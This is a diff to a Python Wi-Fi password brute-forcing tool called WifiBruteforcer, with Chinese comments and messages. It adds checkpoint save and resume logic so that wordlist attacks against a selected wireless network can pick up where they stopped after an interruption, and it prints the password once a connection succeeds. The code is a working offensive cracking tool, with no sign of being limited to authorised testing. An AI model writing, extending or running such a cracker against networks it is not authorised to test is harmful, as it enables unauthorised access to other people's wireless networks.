@@ -20,6 +20,7 @@ class WifiBruteforcer:
 		self.interface = interface
 		self.target_ssid = target_ssid
 		self.password_file = password_file
+		self.checkpoint_file = 'checkpoint.json'
 		if update_wordlist:
 			self.update_password_list()
 		self.passwords = self.load_passwords()
@@ -319,9 +320,39 @@ class WifiBruteforcer:
 			except ValueError:
 				print("[-] 请输入有效的数字")
 
+	def load_checkpoint(self):
+		"""加载断点信息"""
+		try:
+			if os.path.exists(self.checkpoint_file):
+				with open(self.checkpoint_file, 'r') as f:
+					checkpoint = json.load(f)
+				print(f"[*] 找到断点记录: {checkpoint['ssid']}, 已尝试 {checkpoint['tried']} 个密码")
+				return checkpoint
+		except:
+			pass
+		return None
+		
+	def save_checkpoint(self, network, tried_count):
+		"""保存断点信息"""
+		checkpoint = {
+			'ssid': network['ssid'],
+			'tried': tried_count,
+			'total': len(self.passwords)
+		}
+		with open(self.checkpoint_file, 'w') as f:
+			json.dump(checkpoint, f)
+			
+	def clear_checkpoint(self):
+		"""清除断点信息"""
+		if os.path.exists(self.checkpoint_file):
+			os.remove(self.checkpoint_file)
+			
 	def start(self):
 		"""开始破解过程"""
 		print("[*] 开始破解...")
+		
+		# 加载断点信息
+		checkpoint = self.load_checkpoint()
 		
 		if self.target_ssid:
 			print(f"[*] 正在搜索目标网络: {self.target_ssid}")
@@ -332,42 +363,42 @@ class WifiBruteforcer:
 			print(f"[+] 找到目标网络")
 		else:
 			networks = self.select_network()
-
-		print(f"[*] 正在加载密码...")
-		if not self.passwords:
-			print("[-] 密码列表为空")
-			return False
-		
-		nb_loops = len(self.passwords) * len(networks)
-		print(f"\n[*] 载入 {len(self.passwords)} 个密码")
-		print(f"[*] 总共需要尝试 {nb_loops} 次")
-
+			
 		try:
 			for network in networks:
+				# 如果有断点且不是同一个网络，跳过断点
+				if checkpoint and checkpoint['ssid'] != network['ssid']:
+					checkpoint = None
+				
 				print(f"\n[*] 尝试破解网络: {network['ssid']} ({network['security']})")
 				print(f"[*] 信号强度: {network['signal']}")
 				print(f"[*] 信道: {network['channel']}")
 				
-				print("[*] 确保网卡开启...")
-				subprocess.run(["networksetup", "-setairportpower", "en0", "on"])
+				# 从断点处继续
+				start_index = checkpoint['tried'] if checkpoint else 0
 				
-				nb_test = 0
-				for password in self.passwords:
-					nb_test += 1
-					sys.stdout.write(f'\r[*] 进度: {nb_test}/{nb_loops} - 当前密码: {password}')
+				for idx, password in enumerate(self.passwords[start_index:], start_index):
+					sys.stdout.write(f'\r[*] 进度: {idx+1}/{len(self.passwords)} - 当前密码: {password}')
 					sys.stdout.flush()
+					
+					# 保存断点
+					self.save_checkpoint(network, idx+1)
 
 					if self.try_connect(network, password):
 						print(f"\n[+] 成功破解! 网络: {network['ssid']}, 密码: {password}")
+						self.clear_checkpoint()
 						return True
-
+						
 				print(f"\n[-] 未能破解网络: {network['ssid']}")
-			
+				self.clear_checkpoint()
+				
 		except KeyboardInterrupt:
 			print("\n[!] 用户中断操作")
+			print("[*] 已保存断点，下次可继续破解")
+			return False
 		except Exception as e:
 			print(f"\n[-] 发生错误: {str(e)}")
-			print(f"[-] 错误详情: {traceback.format_exc()}")
+			return False
 		finally:
 			print("\n[*] 正在恢复网卡状态...")
 			try:
